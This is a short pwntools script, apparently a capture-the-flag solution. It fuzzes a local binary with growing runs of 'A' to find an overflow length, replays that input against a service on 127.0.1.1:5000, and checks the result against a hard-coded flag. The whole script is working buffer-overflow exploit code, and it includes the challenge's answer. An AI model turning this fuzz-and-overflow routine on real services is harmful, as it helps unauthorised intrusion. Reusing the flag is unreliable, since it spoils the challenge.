from pwn import *

buffersize = 0
for i in range(30, 999):
    p = process('./BinX.bin')
    print(f"Prompt: {p.recv()}")
    p.sendline(i * 'A')
    print(f"Prompt: {p.recv()}")
    p.sendline(i * 'A')
    out = p.recv()
    print(f'Output: {out}')
    if (b'flag' in out):
        print(f"Buffer size is {i}")
        buffersize = i
        break
    else:
        continue
# Found buffer do remote
r = remote('127.0.1.1', '5000')
print(f'Received: {r.recv()}')
send = b'A' * (buffersize)
print(f'Sending: {send}')
r.sendline(send)
print(f'Received: {r.recv()}')
print(f'Sending: {send}')
r.sendline(send)
print(f'Received: {r.recv()}')
flag = r.recv()
print(f'Received flag: {flag}')
assert flag == b'The flag is }%?\xc9\x98\xc9\x98\xc6\xa7$U\xe1\x82\xa7\xc9\x98#5\xc9\xbf3@v3!\xd0\xaf{42\xc6\x86\xd0\x98\xe2\x85\x83\n\n'
